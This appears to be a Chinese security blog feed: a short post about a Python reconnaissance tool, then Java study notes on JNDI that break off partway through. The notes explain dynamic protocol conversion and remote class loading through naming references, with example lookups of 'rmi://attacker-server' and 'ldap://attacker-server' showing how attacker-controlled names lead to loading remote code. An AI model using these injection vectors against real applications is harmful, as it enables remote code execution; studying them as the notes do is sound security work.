&lt;summary>
&lt;h4 class="inline">
一些代码方面不算思考的思考
&lt;/h4>
&lt;/summary>
&lt;p>最近把一个自用的信息收集向工具（python编写 streamlit强力驱动）&lt;a href="https://github.com/AmiaaaZ/200scan">200scan&lt;/a>转为公开仓库了，使用体验上来说目前觉得还挺不错（大概）&lt;/p>
&lt;p>单论代码来说真没多少含金量 核心逻辑极其简单，但在写的时候还是稍微悟了一小点东西，注意到了平时写的时候不会注意到的点。首先是代码风格，比如变量名是下划线/驼峰？是否完全按照PEP8的编码规范？目前我的变量名是下划线，函数名是驼峰，格式化字符串全部用f-string，基本遵守PEP8让代码更具有可读性；代码风格其实都是花架子，真正想要编写一个好用的工具时必然会被迫去注意性能问题，比如我要解析requests返回的页面，是用re还是bs4？这个循环换个方式写会不会更好？这个字典操作是不是太复杂了？要不要多加一个try catch？等等等等这类问题是我以前从不会注意的，感觉代码能跑就行，快不快无所谓；最后还会被迫注意是否具有可扩展性，比如这个功能重复使用是否可以抽象为函数或者类？然后就会不自觉地去搜索对应的最佳实践，还有其它语言在对应方面的表现是否更好&lt;/p>
&lt;p>最开始200scan只是一个简单的命令行工具，只有读urls.txt然后输出对应的results.txt的功能，后来用的多了就希望能有个高交互的GUI界面，尝试了一下javafx就放弃了，实在是不喜欢java的臃肿，之后就转向了宇宙之神streamlit，但是目前写过200Scan, fofa WebViewer, check AV这三个功能以后也逐渐感受到了它的局限，不过streamlit的版本迭代非常快，估计也是问题不大&lt;/p>
&lt;p>说来真的是无比惭愧，接触python这个语言也两年多了，但还是不能写起代码来得心应手，java也磕磕绊绊学了小半年了，进行代码审计的时候还是会头大，go一直说要学，到现在也只会个基本语法……太菜了太菜了啊啊啊啊啊，都大三了还这么沸物，还是个铁沸物&lt;/p>
&lt;p>这学期我必好好学习，拼搏半年 我要转安研！&lt;/p>
&lt;/details></description></item><item><title>Java学习笔记Ⅵ</title><link>https://amiaaaz.github.io/2022/06/20/java-study-notes-06/</link><pubDate>Mon, 20 Jun 2022 15:25:44 +0800</pubDate><guid>https://amiaaaz.github.io/2022/06/20/java-study-notes-06/</guid><description>&lt;p>仅学习记录自用，请勿作参考（&lt;/p>
&lt;hr>
&lt;h1 id="前置">前置&lt;/h1>
&lt;h2 id="命名目录服务">命名&amp;amp;目录服务&lt;/h2>
&lt;ul>
&lt;li>命名服务是将名称与值相关联的实体，称为&amp;quot;绑定&amp;quot;。它提供了一种使用&amp;quot;find&amp;quot;或&amp;quot;search&amp;quot;操作来根据名称查找对象的便捷方式，比如DNS和RMI Registry&lt;/li>
&lt;li>目录服务是一种特殊的命名服务，允许存储和搜索&amp;quot;目录对象&amp;quot;，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。&lt;/li>
&lt;/ul>
&lt;h2 id="jndi">JNDI&lt;/h2>
&lt;p>Java Naming and Directory Interface，是Java提供的API，包括Naming Service和Directory Service，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）&lt;/p>
&lt;ul>
&lt;li>&lt;strong>原子名&lt;/strong>是一个简单、基本、不可分割的组成部分&lt;/li>
&lt;li>&lt;strong>绑定&lt;/strong>是名称与对象的关联，每个绑定都有一个不同的原子名&lt;/li>
&lt;li>&lt;strong>复合名&lt;/strong>包含零个或多个原子名，即由多个绑定组成&lt;/li>
&lt;li>&lt;strong>上下文&lt;/strong>是包含零个或多个绑定的对象，每个绑定都有一个不同的原子名&lt;/li>
&lt;li>命名系统是一组关联的上下文&lt;/li>
&lt;li>名称空间是命名系统中包含的所有名称&lt;/li>
&lt;li>探索名称空间的起点称为初始上下文&lt;/li>
&lt;li>要获取初始上下文，需要使用初始上下文工厂&lt;/li>
&lt;/ul>
&lt;p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind，比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的&lt;strong>JNDI动态协议转换&lt;/strong>。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。&lt;/p>
&lt;h3 id="示例">示例&lt;/h3>
&lt;ul>
&lt;li>JNDI与RMI配合使用&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Hashtable&lt;/span> &lt;span style="color:#111">env&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Hashtable&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INITIAL_CONTEXT_FACTORY&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;com.sun.jndi.rmi.registry.RegistryContextFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">PROVIDER_URL&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;rmi://localhost:9999&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;refObj&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RefObject&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//通过名称查找对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;refObj&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>JNDI与LDAP配合使用&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Hashtable&lt;/span> &lt;span style="color:#111">env&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Hashtable&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INITIAL_CONTEXT_FACTORY&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;com.sun.jndi.ldap.LdapCtxFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">PROVIDER_URL&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ldap://localhost:1389&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DirContext&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialDirContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">local_obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cn=foo,dc=test,dc=org&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="动态协议转换">动态协议转换&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://attacker-server/refObj&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//ctx.lookup(&amp;#34;ldap://attacker-server/cn=bar,dc=test,dc=org&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//ctx.lookup(&amp;#34;iiop://attacker-server/bar&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面没有设置对应服务的工厂以及PROVIDER_URL，JNDI根据传递的URL协议自动转换与设置了对应的工厂与PROVIDER_URL&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Hashtable&lt;/span> &lt;span style="color:#111">env&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Hashtable&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INITIAL_CONTEXT_FACTORY&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;com.sun.jndi.rmi.registry.RegistryContextFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">PROVIDER_URL&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://localhost:9999&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ldap://attacker-server/cn=bar,dc=test,dc=org&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//通过名称查找对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>即使服务端提前设置了工厂与PROVIDER_URL也不要紧，如果在lookup时参数能够被攻击者控制，同样会根据攻击者提供的URL进行动态转换&lt;/p>
&lt;p>在使用lookup方法时，会进入getURLOrDefaultInitCtx这个方法，转换就在这里面：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NamingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getURLOrDefaultInitCtx&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#75af00">getURLOrDefaultInitCtx&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NamingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NamingManager&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasInitialContextFactoryBuilder&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#75715e">//这里不是说我们设置了上下文环境变量就会进入，因为我们没有执行初始化上下文工厂的构建，所以上面那两种情况在这里都不会进入
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getDefaultInitCtx&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">scheme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getURLScheme&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>&lt;span style="color:#75715e">//尝试从名称解析URL中的协议
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">scheme&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">NamingManager&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getURLContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">scheme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">myProps&lt;/span>&lt;span style="color:#f92672">);&lt;/span>&lt;span style="color:#75715e">//如果解析出了Schema协议，则尝试获取其对应的上下文环境
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getDefaultInitCtx&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="命名引用">命名引用&lt;/h3>
&lt;p>为了在命名或目录服务中绑定Java对象，可以使用Java序列化传输对象，例如上面示例的第一个例子，将一个对象绑定到了远程服务器，就是通过反序列化将对象传输过去的。但是，并非总是通过序列化去绑定对象，因为它可能太大或不合适。为了满足这些需求，JNDI定义了命名引用，以便对象可以通过绑定由命名管理器解码并解析为原始对象的一个引用间接地存储在命名或目录服务中。&lt;/p>
&lt;p>引用由Reference类表示，并且由地址和有关被引用对象的类信息组成，每个地址都包含有关如何构造对象。&lt;/p>
&lt;p>Reference可以使用工厂来构造对象。当使用lookup查找对象时，Reference将使用工厂提供的工厂类加载地址来加载工厂类，工厂类将构造出需要的对象：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#111">reference&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;MyClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;MyClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">FactoryURL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ReferenceWrapper&lt;/span> &lt;span style="color:#111">wrapper&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ReferenceWrapper&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">reference&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">wrapper&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="远程代码库和安全管理器">远程代码库和安全管理器&lt;/h3>
&lt;p>在JNDI栈中，不是所有的组件都被同等对待。当验证从何处加载远程类时JVM的行为不同。从远程加载类有两个不同的级别：&lt;/p>
&lt;ul>
&lt;li>命名管理器级别&lt;/li>
&lt;li>服务提供者接口（SPI）级别&lt;/li>
&lt;/ul>
&lt;p>JNDI体系结构：&lt;/p>
&lt;p>&lt;img src="https://images.seebug.org/content/images/2019/12/05/1575516121000-13.png-w331s" alt="img">&lt;/p>
&lt;p>在SPI级别，JVM将允许从远程代码库加载类并实施安全性。管理器的安装取决于特定的提供程序（例如在上面说到的RMI那些利用方式就是SPI级别，必须设置安全管理器）：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">Provider&lt;/th>
&lt;th style="text-align:left">Property to enable remote class loading&lt;/th>
&lt;th style="text-align:left">是否需要强制安装Security Manager&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">RMI&lt;/td>
&lt;td style="text-align:left">java.rmi.server.useCodebaseOnly = false (&lt;strong>JDK 6u45、JDK 7u21之后默认为true&lt;/strong>)&lt;/td>
&lt;td style="text-align:left">需要&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">LDAP&lt;/td>
&lt;td style="text-align:left">com.sun.jndi.ldap.object.trustURLCodebase = true（default = false）&lt;/td>
&lt;td style="text-align:left">非必须&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">CORBA&lt;/td>
&lt;td style="text-align:left">&lt;/td>
&lt;td style="text-align:left">需要&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>但是，在Naming Manager层放宽了安全控制。解码JNDI命名时始终允许引用从远程代码库加载类，而没有JVM选项可以禁用它，并且不需要强制安装任何安全管理器，例如上面说到的命名引用那种方式。&lt;/p>
&lt;h3 id="结构">结构&lt;/h3>
&lt;p>在&lt;code>Java JDK&lt;/code>里面提供了5个包，提供给&lt;code>JNDI&lt;/code>的功能实现，分别是：&lt;/p>
&lt;ul>
&lt;li>javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。&lt;/li>
&lt;li>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；&lt;/li>
&lt;li>javax.naming.event：在命名目录服务器中请求事件通知；&lt;/li>
&lt;li>javax.naming.ldap：提供LDAP支持；&lt;/li>
&lt;li>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。&lt;/li>
&lt;/ul>
&lt;h4 id="initialcontext">InitialContext&lt;/h4>
&lt;p>构造&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//构建一个初始上下文。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//构造一个初始上下文，并选择不初始化它。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">lazy&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//使用提供的环境构建初始上下文。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Hashtable&lt;/span>&lt;span style="color:#f92672">&amp;lt;?,?&amp;gt;&lt;/span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>常用方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//将名称绑定到对象。
